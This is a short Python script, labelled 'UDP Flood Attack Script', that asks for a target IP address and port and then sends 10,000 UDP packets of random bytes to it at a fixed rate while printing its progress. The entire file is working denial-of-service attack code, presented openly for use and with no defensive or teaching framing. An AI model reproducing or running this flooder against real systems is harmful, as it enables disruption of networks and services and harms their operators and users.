import sys
import os
import time
import socket
import random
from datetime import datetime

# Get current time
now = datetime.now()

# Extract hour, minute, day, month, year
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes for packet payload
bytes = random._urandom(1490)

# Clear the screen and display information
os.system("clear")
print("UDP Flood Attack Script")
print("Author   : Saphal Lamsal")
print()

# Input target IP address and port number
ip = input("IP Target : ")
port = int(input("Port       : "))

# Clear the screen and display attack starting message
os.system("clear")
print("UDP Flood Attack Starting")
print("[                    ] 0% ")

# Calculate packets per second and total packet count
packets_per_second = 10000 / 10  # 10,000 packets in 10 seconds
total_packets = 10000

# Calculate the time interval between packets
interval = 1.0 / packets_per_second

# Start sending UDP packets
start_time = time.time()
sent_packets = 0
try:
    while sent_packets < total_packets:
        sock.sendto(bytes, (ip, port))
        sent_packets += 1
        print(f"Sent packet {sent_packets}/{total_packets} to {ip} through port: {port}")
        time.sleep(interval)
except KeyboardInterrupt:
    print("\nAttack stopped.")

# Calculate and print the actual time taken
end_time = time.time()
elapsed_time = end_time - start_time
print("Actual time taken: %.2f seconds" % elapsed_time)
